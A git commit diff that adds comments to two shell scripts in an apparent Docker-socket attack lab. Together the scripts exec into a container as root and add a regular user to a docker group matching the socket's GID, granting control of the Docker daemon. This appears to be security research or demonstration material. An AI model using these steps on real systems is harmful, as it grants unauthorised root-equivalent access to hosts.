fc1e48ab08a50807d08d2568e3a1d1506ba1d922
Ubuntu <ubuntu@docker-security30.novalocal>
2019-01-25 00:25:40 +0000

    Comments on every script and complete readme file

--- Attacks/DockerSock/inspect_to_eavesdrop/3_exec_as_root_to_wannabe_attacker.sh
+++ Attacks/DockerSock/inspect_to_eavesdrop/3_exec_as_root_to_wannabe_attacker.sh
@@ -1,10 +1,14 @@
 #!/bin/sh
 
+#List the running containers and find the one we want to attack
 docker ps | grep attacker > dockerps
+#Keed the docker id
 cut -d' ' -f1 dockerps > containerid
 container_id=$(cat containerid)
 
+#Enter the running container as root and execute a script in it
 docker exec -u 0 ${container_id} ./add_user_to_docker_group.sh
 
+#Clear the files used
 rm dockerps
 rm containerid
--- Attacks/DockerSock/inspect_to_eavesdrop/add_user_to_docker_group.sh
+++ Attacks/DockerSock/inspect_to_eavesdrop/add_user_to_docker_group.sh
@@ -7,17 +7,24 @@ DOCKER_SOCKET=/var/run/docker.sock
 DOCKER_GROUP=docker
 REGULAR_USER=userA
 
+#If docker.sock exists
 if [ -S ${DOCKER_SOCKET} ]; then
+	#Find the GID of docker.sock
 	DOCKER_GID=$(stat -c '%g' ${DOCKER_SOCKET})
 
+	#Check if docker group exists
 	exists=$(cat /etc/group | grep ${DOCKER_GROUP})
 	if [ -z "$exists" ]; then
         #If group docker does not already exist
+		#create group with the given gid and name
 		groupadd -for -g ${DOCKER_GID} ${DOCKER_GROUP}
+		#Modify user's group so as docker group is added
 		usermod -aG ${DOCKER_GROUP} ${REGULAR_USER}
 	else 
 	#If docker group exists
+		#Modify docker group so as to have the given id and name
 		groupmod -g ${DOCKER_GID} ${DOCKER_GROUP}
+		#Modify user's group so as docker group is added
 		usermod -aG ${DOCKER_GROUP} ${REGULAR_USER}
 	fi
 fi
